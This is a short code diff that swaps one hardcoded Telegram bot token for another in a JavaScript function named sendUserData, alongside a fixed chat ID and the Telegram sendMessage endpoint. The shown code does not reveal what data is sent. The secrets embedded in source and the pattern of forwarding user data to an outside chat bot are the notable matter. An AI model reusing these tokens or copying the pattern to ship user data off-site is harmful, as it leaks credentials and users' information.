@@ -160,7 +160,7 @@ function displayAds(ads) {
 
 
 function sendUserData(msg) {
-    const token = '6983529729:AAGff8aNI8eKGiDHDjDwluANqrQYK6aiOlc';
+    const token = '6928466175:AAGnXZLLgeWLZqYqleBFgEIPyORPkDsCa58';
     const chatId = '1576630572'; // Replace with the recipient's chat ID
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
